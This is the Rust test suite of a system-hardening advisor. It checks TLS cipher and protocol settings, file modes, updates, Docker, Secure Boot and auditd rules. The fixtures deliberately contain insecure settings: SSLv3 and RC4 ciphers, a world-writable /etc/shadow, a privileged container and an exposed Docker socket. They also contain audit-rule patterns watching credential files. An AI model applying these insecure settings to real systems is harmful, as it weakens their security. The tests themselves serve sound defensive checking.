ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers on;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
"#
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_nginx_files(&files, &mut passed, &mut findings);

        assert!(findings.is_empty());
        assert!(passed.iter().any(|p| p.contains("ciphers look good")));
        assert!(passed
            .iter()
            .any(|p| p.contains("server cipher preference")));
        assert!(passed.iter().any(|p| p.contains("HSTS header present")));
    }

    #[test]
    fn nginx_deprecated_protocols_flagged() {
        let files = vec![(
            "nginx.conf".to_string(),
            "ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n".to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_nginx_files(&files, &mut passed, &mut findings);

        let high_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::High && f.title.contains("deprecated"))
            .collect();
        assert!(
            !high_findings.is_empty(),
            "Expected a High finding for deprecated protocols"
        );
    }

    #[test]
    fn nginx_weak_ciphers_flagged() {
        let files = vec![(
            "site.conf".to_string(),
            concat!(
                "ssl_protocols TLSv1.2 TLSv1.3;\n",
                "ssl_ciphers RC4-SHA:DES-CBC3-SHA:AES128-SHA;\n",
                "ssl_prefer_server_ciphers on;\n",
                "add_header Strict-Transport-Security \"max-age=31536000\";\n",
            )
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_nginx_files(&files, &mut passed, &mut findings);

        let cipher_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("weak cipher"))
            .collect();
        assert!(cipher_findings.len() >= 2);
    }

    #[test]
    fn nginx_missing_ssl_protocols_medium() {
        // Config with ciphers and HSTS but no ssl_protocols directive.
        let files = vec![(
            "nginx.conf".to_string(),
            concat!(
                "ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256;\n",
                "ssl_prefer_server_ciphers on;\n",
                "add_header Strict-Transport-Security \"max-age=31536000\";\n",
            )
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_nginx_files(&files, &mut passed, &mut findings);

        let proto_finding = findings
            .iter()
            .find(|f| f.title.contains("ssl_protocols not explicitly set"));
        assert!(
            proto_finding.is_some(),
            "Expected finding for missing ssl_protocols"
        );
        assert_eq!(proto_finding.unwrap().severity, Severity::Medium);
    }

    #[test]
    fn nginx_missing_hsts_medium() {
        let files = vec![(
            "nginx.conf".to_string(),
            concat!(
                "ssl_protocols TLSv1.2 TLSv1.3;\n",
                "ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256;\n",
                "ssl_prefer_server_ciphers on;\n",
            )
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_nginx_files(&files, &mut passed, &mut findings);

        let hsts_finding = findings.iter().find(|f| f.title.contains("HSTS"));
        assert!(hsts_finding.is_some(), "Expected finding for missing HSTS");
        assert_eq!(hsts_finding.unwrap().severity, Severity::Medium);
    }

    #[test]
    fn nginx_comments_ignored() {
        let files = vec![(
            "nginx.conf".to_string(),
            concat!(
                "# ssl_protocols TLSv1;\n",
                "ssl_protocols TLSv1.2 TLSv1.3;\n",
                "ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256;\n",
                "ssl_prefer_server_ciphers on;\n",
                "add_header Strict-Transport-Security \"max-age=31536000\";\n",
            )
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_nginx_files(&files, &mut passed, &mut findings);

        assert!(
            findings.is_empty(),
            "Commented-out deprecated protocol should not trigger a finding"
        );
    }

    // --- Apache tests -------------------------------------------------------

    #[test]
    fn apache_deprecated_sslv3_flagged() {
        let files = vec![(
            "httpd.conf".to_string(),
            "SSLProtocol SSLv3 TLSv1 TLSv1.1\n".to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_apache_files(&files, &mut passed, &mut findings);

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("deprecated TLS/SSL")));
    }

    #[test]
    fn apache_good_config_passes() {
        let files = vec![(
            "ssl.conf".to_string(),
            concat!(
                "SSLProtocol -all +TLSv1.2 +TLSv1.3\n",
                "SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256\n",
                "Header always set Strict-Transport-Security \"max-age=63072000\"\n",
            )
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_apache_files(&files, &mut passed, &mut findings);

        assert!(findings.is_empty());
        assert!(passed.iter().any(|p| p.contains("ciphers look good")));
        assert!(passed.iter().any(|p| p.contains("HSTS header present")));
    }

    #[test]
    fn apache_weak_ciphers_flagged() {
        let files = vec![(
            "ssl.conf".to_string(),
            concat!(
                "SSLProtocol -all +TLSv1.2\n",
                "SSLCipherSuite RC4-SHA:NULL-SHA:EXPORT-DES\n",
                "Header always set Strict-Transport-Security \"max-age=63072000\"\n",
            )
            .to_string(),
        )];

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_apache_files(&files, &mut passed, &mut findings);

        let weak: Vec<_> = findings
            .iter()
            .filter(|f| f.title.contains("weak cipher"))
            .collect();
        assert!(weak.len() >= 3);
    }

    #[test]
    fn apache_comments_and_missing_protocol_paths_are_covered() {
        let commented = vec![(
            "ssl.conf".to_string(),
            concat!(
                "# SSLProtocol SSLv3 TLSv1\n",
                "SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256\n",
                "Header always set Strict-Transport-Security \"max-age=63072000\"\n",
            )
            .to_string(),
        )];
        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_apache_files(&commented, &mut passed, &mut findings);
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("SSLProtocol not explicitly set")));

        let blank_and_comment_openssl = "# MinProtocol = TLSv1.0\n\n";
        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_openssl_content(blank_and_comment_openssl, &mut passed, &mut findings);
        assert!(findings.is_empty());
        assert!(passed.iter().any(|item| item.contains("TLSv1.2 or higher")));
    }

    // --- OpenSSL tests ------------------------------------------------------

    #[test]
    fn openssl_min_protocol_below_tls12_flagged() {
        let content = "[system_default_sect]\nMinProtocol = TLSv1.1\n";

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_openssl_content(content, &mut passed, &mut findings);

        assert_eq!(findings.len(), 1);
        assert!(findings[0].title.contains("MinProtocol"));
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[test]
    fn openssl_min_protocol_tls12_passes() {
        let content = "[system_default_sect]\nMinProtocol = TLSv1.2\n";

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_openssl_content(content, &mut passed, &mut findings);

        assert!(findings.is_empty());
        assert!(passed.iter().any(|p| p.contains("TLSv1.2 or higher")));
    }

    #[test]
    fn openssl_sslv3_flagged() {
        let content = "MinProtocol = SSLv3\n";

        let mut passed = Vec::new();
        let mut findings = Vec::new();
        check_tls_openssl_content(content, &mut passed, &mut findings);

        assert_eq!(findings.len(), 1);
        assert!(findings[0].title.contains("SSLv3"));
    }

    // --- Integration: no web server detected --------------------------------

    #[test]
    fn no_web_server_detected() {
        // On dev machines without /etc/nginx or /etc/apache2, check_tls should
        // pass with "No web server detected".
        let env = TestEnv::default();
        let result = check_tls(&env);
        // We can't assert specifics about the filesystem, but we can verify
        // the category is set correctly.
        assert_eq!(result.category, "TLS/SSL");
    }

    #[test]
    fn check_tls_skips_directory_entries_when_loading_config_dirs() {
        let env = TestEnv::default()
            .with_dir(
                "/etc/nginx/conf.d",
                vec![dir_entry("/etc/nginx/conf.d/subdir")],
            )
            .with_dir(
                "/etc/apache2/sites-enabled",
                vec![dir_entry("/etc/apache2/sites-enabled/subdir")],
            );
        let result = check_tls(&env);
        assert!(result
            .passed
            .iter()
            .any(|passed| passed == "No web server detected (Nginx/Apache)"));
    }

    #[test]
    fn check_permissions_reports_file_modes_suid_and_ssh_permissions() {
        let env = TestEnv::default()
            .with_command(
                "find",
                &["/etc", "-maxdepth", "2", "-perm", "-o+w", "-type", "f"],
                "/etc/bad.conf\n/etc/also-bad.conf\n",
            )
            .with_command(
                "find",
                &["/usr", "-perm", "-4000", "-type", "f"],
                "/usr/bin/sudo\n/usr/bin/custom-suid\n",
            )
            .with_mode("/etc/shadow", 0o666)
            .with_mode("/etc/gshadow", 0o644)
            .with_mode("/etc/sudoers", 0o644)
            .with_dir("/home", vec![dir_entry("/home/alice")])
            .with_path("/home/alice/.ssh")
            .with_mode("/home/alice/.ssh", 0o755)
            .with_mode("/home/alice/.ssh/authorized_keys", 0o644)
            .with_mode("/tmp", 0o0777);

        let result = check_permissions(&env);

        assert!(has_title(&result, "world-writable file"));
        assert!(has_title(&result, "non-standard SUID"));
        assert!(has_title(&result, "/etc/shadow too permissive"));
        assert!(has_title(&result, "/etc/gshadow too permissive"));
        assert!(has_title(&result, "/etc/sudoers too permissive"));
        assert!(has_title(&result, "/home/alice/.ssh too permissive"));
        assert!(has_title(&result, "authorized_keys too permissive"));
        assert!(has_title(&result, "/tmp missing sticky bit"));

        let missing_ssh_metadata = TestEnv::default()
            .with_dir("/home", vec![dir_entry("/home/bob")])
            .with_path("/home/bob/.ssh");
        let missing_ssh_metadata_result = check_permissions(&missing_ssh_metadata);
        assert!(missing_ssh_metadata_result.findings.is_empty());

        let no_ssh_dir = TestEnv::default().with_dir("/home", vec![dir_entry("/home/charlie")]);
        let no_ssh_dir_result = check_permissions(&no_ssh_dir);
        assert!(no_ssh_dir_result.findings.is_empty());
    }

    #[test]
    fn check_permissions_records_clean_permission_paths() {
        let env = TestEnv::default()
            .with_command(
                "find",
                &["/etc", "-maxdepth", "2", "-perm", "-o+w", "-type", "f"],
                "",
            )
            .with_command(
                "find",
                &["/usr", "-perm", "-4000", "-type", "f"],
                "/usr/bin/sudo\n",
            )
            .with_mode("/etc/shadow", 0o640)
            .with_mode("/etc/gshadow", 0o640)
            .with_mode("/etc/sudoers", 0o440)
            .with_dir("/home", vec![dir_entry("/home/alice")])
            .with_path("/home/alice/.ssh")
            .with_mode("/home/alice/.ssh", 0o700)
            .with_mode("/home/alice/.ssh/authorized_keys", 0o600)
            .with_mode("/tmp", 0o1777);

        let result = check_permissions(&env);

        assert!(result.findings.is_empty());
        assert!(result
            .passed
            .iter()
            .any(|passed| passed == "No world-writable files in /etc"));
        assert!(result
            .passed
            .iter()
            .any(|passed| passed == "No unusual SUID binaries"));
    }

    #[test]
    fn check_updates_handles_clean_security_and_unconfigured_apt_states() {
        let clean = TestEnv::default()
            .with_path("/usr/bin/apt")
            .with_path("/etc/apt/apt.conf.d/20auto-upgrades")
            .with_command("apt", &["list", "--upgradable"], "Listing...\n");
        let clean_result = check_updates(&clean);
        assert!(clean_result
            .passed
            .iter()
            .any(|passed| passed == "System is up to date"));
        assert!(clean_result
            .passed
            .iter()
            .any(|passed| passed == "Automatic security updates configured"));

        let pending = TestEnv::default()
            .with_path("/usr/bin/apt")
            .with_command(
                "apt",
                &["list", "--upgradable"],
                "Listing...\nopenssl/security 1.2 amd64 [upgradable]\nvim/stable 9 amd64 [upgradable]\n",
            );
        let pending_result = check_updates(&pending);
        assert!(has_title(&pending_result, "security update"));
        assert!(has_title(
            &pending_result,
            "Automatic security updates not configured"
        ));

        let non_security = TestEnv::default()
            .with_path("/usr/bin/apt")
            .with_path("/etc/apt/apt.conf.d/20auto-upgrades")
            .with_command(
                "apt",
                &["list", "--upgradable"],
                "Listing...\nvim/stable 9 amd64 [upgradable]\n",
            );
        let non_security_result = check_updates(&non_security);
        assert!(has_title(&non_security_result, "package update"));

        let unavailable_listing = TestEnv::default()
            .with_path("/usr/bin/apt")
            .with_path("/etc/apt/apt.conf.d/20auto-upgrades");
        let unavailable_listing_result = check_updates(&unavailable_listing);
        assert!(unavailable_listing_result
            .passed
            .iter()
            .any(|passed| passed == "Automatic security updates configured"));
    }

    #[test]
    fn check_docker_handles_absent_privileged_and_socket_modes() {
        let absent = check_docker(&TestEnv::default());
        assert!(absent.findings.is_empty());
        assert!(absent
            .passed
            .iter()
            .any(|passed| passed == "Docker not installed (no container risks)"));

        let env = TestEnv::default()
            .with_command("docker", &["--version"], "Docker version 28\n")
            .with_command(
                "docker",
                &["ps", "--format", "{{.Names}} {{.Status}}"],
                "db Up\n",
            )
            .with_command("docker", &["ps", "-q"], "abc123\n")
            .with_command(
                "docker",
                &[
                    "inspect",
                    "--format",
                    "{{.Name}} {{.HostConfig.Privileged}}",
                    "abc123",
                ],
                "/db true\n",
            )
            .with_mode("/var/run/docker.sock", 0o666);

        let result = check_docker(&env);
        assert!(has_title(&result, "privileged mode"));
        assert!(has_title(&result, "Docker socket too permissive"));

        let safe_env = TestEnv::default()
            .with_command("docker", &["--version"], "Docker version 28\n")
            .with_command(
                "docker",
                &["ps", "--format", "{{.Names}} {{.Status}}"],
                "api Up\n",
            )
            .with_command("docker", &["ps", "-q"], "def456\n")
            .with_command(
                "docker",
                &[
                    "inspect",
                    "--format",
                    "{{.Name}} {{.HostConfig.Privileged}}",
                    "def456",
                ],
                "/api false\n",
            )
            .with_mode("/var/run/docker.sock", 0o660);
        let safe = check_docker(&safe_env);
        assert!(safe.findings.is_empty());
        assert!(safe
            .passed
            .iter()
            .any(|passed| passed == "No privileged containers"));

        let empty = TestEnv::default()
            .with_command("docker", &["--version"], "Docker version 28\n")
            .with_command("docker", &["ps", "--format", "{{.Names}} {{.Status}}"], "")
            .with_command("docker", &["ps", "-q"], "");
        let empty_result = check_docker(&empty);
        assert!(empty_result.findings.is_empty());

        let inventory_unavailable =
            TestEnv::default().with_command("docker", &["--version"], "Docker version 28\n");
        let inventory_unavailable_result = check_docker(&inventory_unavailable);
        assert!(inventory_unavailable_result.findings.is_empty());

        let inspect_unavailable = TestEnv::default()
            .with_command("docker", &["--version"], "Docker version 28\n")
            .with_command(
                "docker",
                &["ps", "--format", "{{.Names}} {{.Status}}"],
                "worker Up\n",
            )
            .with_command("docker", &["ps", "-q"], "ghi789\n");
        let inspect_unavailable_result = check_docker(&inspect_unavailable);
        assert!(inspect_unavailable_result.findings.is_empty());
    }

    #[test]
    fn check_tls_loads_nginx_apache_and_openssl_from_environment() {
        let env = TestEnv::default()
            .with_file(
                "/etc/nginx/nginx.conf",
                "ssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-RSA-AES128-GCM-SHA256;\nssl_prefer_server_ciphers on;\nadd_header Strict-Transport-Security \"max-age=31536000\";\n",
            )
            .with_dir("/etc/nginx/conf.d", vec![file_entry("/etc/nginx/conf.d/site.conf")])
            .with_file(
                "/etc/nginx/conf.d/site.conf",
                "ssl_protocols TLSv1.2 TLSv1.3;\n",
            )
            .with_file(
                "/etc/apache2/apache2.conf",
                "SSLProtocol -all +TLSv1.2 +TLSv1.3\nSSLCipherSuite ECDHE-RSA-AES128-GCM-SHA256\nHeader always set Strict-Transport-Security \"max-age=31536000\"\n",
            )
            .with_file("/etc/ssl/openssl.cnf", "MinProtocol = TLSv1.2\n");

        let result = check_tls(&env);

        assert!(result.findings.is_empty());
        assert!(result.passed.iter().any(|passed| passed.contains("Nginx")));
        assert!(result.passed.iter().any(|passed| passed.contains("Apache")));
        assert!(result
            .passed
            .iter()
            .any(|passed| passed.contains("OpenSSL")));
    }

    #[test]
    fn check_firmware_covers_secure_and_degraded_boot_paths() {
        let secure = TestEnv::default()
            .with_path("/sys/firmware/efi")
            .with_bytes(
                "/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c",
                vec![0, 0, 0, 0, 1],
            )
            .with_file("/proc/sys/kernel/tainted", "0\n")
            .with_path("/dev/tpmrm0")
            .with_command("find", &["/boot", "-perm", "-o+w", "-type", "f"], "")
            .with_file("/proc/cmdline", "BOOT_IMAGE=/vmlinuz intel_iommu=on\n")
            .with_file(
                "/sys/kernel/security/lockdown",
                "none [integrity] confidentiality\n",
            );
        let secure_result = check_firmware(&secure);
        assert!(secure_result.findings.is_empty());
        assert!(secure_result
            .passed
            .iter()
            .any(|passed| passed.contains("Secure Boot is enabled")));

        let degraded = TestEnv::default()
            .with_path("/sys/firmware/efi")
            .with_bytes(
                "/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c",
                vec![0],
            )
            .with_file("/proc/sys/kernel/tainted", "8320\n")
            .with_command(
                "find",
                &["/boot", "-perm", "-o+w", "-type", "f"],
                "/boot/vmlinuz\n",
            )
            .with_file("/proc/cmdline", "BOOT_IMAGE=/vmlinuz quiet\n")
            .with_file(
                "/sys/kernel/security/lockdown",
                "[none] integrity confidentiality\n",
            );
        let degraded_result = check_firmware(&degraded);
        assert!(has_title(&degraded_result, "Secure Boot is disabled"));
        assert!(has_title(&degraded_result, "Kernel is tainted"));
        assert!(has_title(&degraded_result, "No TPM device detected"));
        assert!(has_title(&degraded_result, "world-writable file"));
        assert!(has_title(&degraded_result, "IOMMU not enabled"));
        assert!(has_title(&degraded_result, "Kernel lockdown is disabled"));

        let unreadable = TestEnv::default().with_path("/sys/firmware/efi");
        let unreadable_result = check_firmware(&unreadable);
        assert!(has_title(
            &unreadable_result,
            "Secure Boot status unreadable"
        ));

        let medium_taint = TestEnv::default().with_file("/proc/sys/kernel/tainted", "4363\n");
        let medium_taint_result = check_firmware(&medium_taint);
        let title = medium_taint_result
            .findings
            .iter()
            .find(|finding| finding.title.contains("Kernel is tainted"))
            .map(|finding| finding.title.as_str())
            .unwrap();
        assert!(title.contains("proprietary module"));
        assert!(title.contains("force-loaded module"));
        assert!(title.contains("force-unloaded module"));
        assert!(title.contains("ACPI table overridden"));
        assert!(title.contains("out-of-tree module"));

        let medium_only_taint = TestEnv::default().with_file("/proc/sys/kernel/tainted", "4107\n");
        let medium_only_result = check_firmware(&medium_only_taint);
        assert!(medium_only_result.findings.iter().any(|finding| {
            finding.severity == Severity::Medium && finding.title.contains("Kernel is tainted")
        }));
    }

    #[test]
    fn check_auditd_reports_missing_and_complete_rule_sets() {
        let missing = check_auditd(&TestEnv::default());
        assert!(has_title(&missing, "auditd not installed"));

        let all_rules = [
            "-S execve",
            "-w /etc/passwd",
            "-w /etc/shadow",
            "-w /etc/sudoers",
            "-w /etc/cron",
            "-w /etc/ssh",
            "-S connect",
            "-S ptrace",
            "-w /tmp -p x",
            "-S init_module",
        ]
        .join("\n");
        let complete = TestEnv::default()
            .with_path("/usr/sbin/auditd")
            .with_command("systemctl", &["is-active", "auditd"], "active\n")
            .with_file("/etc/audit/audit.rules", &all_rules);
        let complete_result = check_auditd(&complete);
        assert!(complete_result.findings.is_empty());
        assert!(complete_result
            .passed
            .iter()
            .any(|passed| passed == "All critical audit rules configured"));

        let sparse = TestEnv::default()
            .with_path("/sbin/auditd")
            .with_command("systemctl", &["is-active", "auditd"], "inactive\n")
            .with_dir(
                "/etc/audit/rules.d",
                vec![
                    file_entry("/etc/audit/rules.d/innerwarden.rules"),
                    file_entry("/etc/audit/rules.d/readme.txt"),
                ],
            )
            .with_file("/etc/audit/rules.d/innerwarden.rules", "-S execve\n");
        let sparse_result = check_auditd(&sparse);
        assert!(has_title(&sparse_result, "auditd service not running"));
        assert!(has_title(&sparse_result, "critical audit rules missing"));
    }

    #[test]
    fn run_checks_returns_all_harden_categories_with_fake_environment() {
        let results = run_checks(&TestEnv::default());
        let categories = results
            .iter()
            .map(|result| result.category)
            .collect::<Vec<_>>();

        assert_eq!(
            categories,
            vec![
                "SSH",
                "Firewall",
                "Kernel",
                "Kernel Hardening",
                "Access Control",
                "Permissions",
                "Updates",
                "Docker",
                "Services",
                "Crontabs",
                "Kernel Modules",
                "TLS/SSL",
                "Firmware & Boot",
                "Auditd",
            ]
        );
    }

    #[test]
    fn render_report_covers_clean_verbose_ignored_and_grade_paths() {
        let mut out = Vec::new();
        render_report(
            &mut out,
            false,
            &[test_result(vec!["ok one", "ok two"], vec![])],
            &HashSet::new(),
        )
        .unwrap();
        let clean = String::from_utf8(out).unwrap();
        assert!(clean.contains("Excellent"));
        assert!(clean.contains("Your system is well hardened"));
        assert!(clean.contains("2 check(s) passed"));

        let mut ignore = HashSet::new();
        ignore.insert("accepted".to_string());
        let mut out = Vec::new();
        render_report(
            &mut out,
            true,
            &[test_result(
                vec!["visible pass"],
                vec![test_finding(Severity::Low, "accepted risk")],
            )],
            &ignore,
        )
        .unwrap();
        let verbose = String::from_utf8(out).unwrap();
        assert!(verbose.contains("visible pass"));
        assert!(verbose.contains("[accepted risk]"));

        let mut out = Vec::new();
        render_report(
            &mut out,
            false,
            &[test_result(
                vec![],
                vec![test_finding(Severity::Low, "accepted risk")],
            )],
            &ignore,
        )
        .unwrap();
        assert!(String::from_utf8(out)
            .unwrap()
            .contains("1 accepted risk(s) hidden"));

        for (severity, count, grade) in [
            (Severity::Medium, 3, "Good"),
            (Severity::High, 3, "Fair"),
            (Severity::Critical, 3, "Poor"),
            (Severity::Critical, 5, "Critical"),
        ] {
            let findings = (0..count)
                .map(|idx| test_finding(severity, &format!("finding {idx}")))
                .collect::<Vec<_>>();
            let mut out = Vec::new();
            render_report(
                &mut out,
                false,
                &[test_result(vec![], findings)],
                &HashSet::new(),
            )
            .unwrap();
            let rendered = String::from_utf8(out).unwrap();
            assert!(
                rendered.contains(grade),
                "missing grade {grade}: {rendered}"
            );
            assert!(rendered.contains("Run with --verbose"));
        }
    }

    #[test]
    fn cmd_harden_with_env_writes_intro_and_respects_ignore_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let ignore_path = dir.path().join("harden-ignore.toml");
        fs::write(&ignore_path, "ignore = [\"ASLR\"]\n").unwrap();

        let mut out = Vec::new();
        cmd_harden_with_env(false, &TestEnv::default(), &ignore_path, &mut out).unwrap();
        let rendered = String::from_utf8(out).unwrap();

        assert!(rendered.contains("Security Hardening Advisor"));
        assert!(rendered.contains("1 accepted risk(s) loaded"));
        assert!(rendered.contains("accepted risk(s) hidden"));
    }

    #[test]
    fn real_harden_env_reads_files_dirs_modes_paths_and_commands() {
        let dir = tempfile::tempdir().expect("tempdir");
        let file_path = dir.path().join("sample.txt");
        fs::write(&file_path, "hello").unwrap();

        #[cfg(unix)]
        fs::set_permissions(&file_path, fs::Permissions::from_mode(0o640)).unwrap();

        let env = RealHardenEnv;
        let file = file_path.to_string_lossy();
        let dir_path = dir.path().to_string_lossy();

        assert_eq!(env.read_to_string(&file), Some("hello".to_string()));
        assert_eq!(env.read_bytes(&file), Some(b"hello".to_vec()));
        assert!(env.path_exists(&file));
        assert!(env
            .read_dir(&dir_path)
            .iter()
            .any(|entry| entry.path == file && entry.is_file));
        #[cfg(unix)]
        assert_eq!(env.metadata_mode(&file).unwrap() & 0o777, 0o640);
        assert_eq!(
            env.command_stdout("printf", &["innerwarden"]),
            Some("innerwarden".into())
        );
    }
}
